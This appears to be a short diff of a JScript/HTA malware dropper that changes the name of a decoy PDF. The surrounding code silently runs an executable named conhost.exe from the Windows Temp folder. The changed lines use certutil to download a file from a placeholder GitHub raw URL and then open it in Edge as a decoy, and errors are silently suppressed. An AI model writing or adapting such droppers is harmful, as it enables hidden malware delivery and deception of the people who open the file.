@@ -25,10 +25,10 @@ try {
     shell.Run("C:\\Windows\\Temp\\conhost.exe", 0, false);
 
 
-    shell.Run("cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/youruser/yourrepo/main/decoy.pdf C:\\Windows\\Temp\\decoy.pdf", 0, true);
+    shell.Run("cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/youruser/yourrepo/main/bbb.pdf C:\\Windows\\Temp\\bbb.pdf", 0, true);
 
 
-    shell.Run("msedge.exe file:///C:/Windows/Temp/decoy.pdf", 0, false);
+    shell.Run("msedge.exe file:///C:/Windows/Temp/bbb.pdf", 0, false);
 
     window.close();
 } catch (e) {}
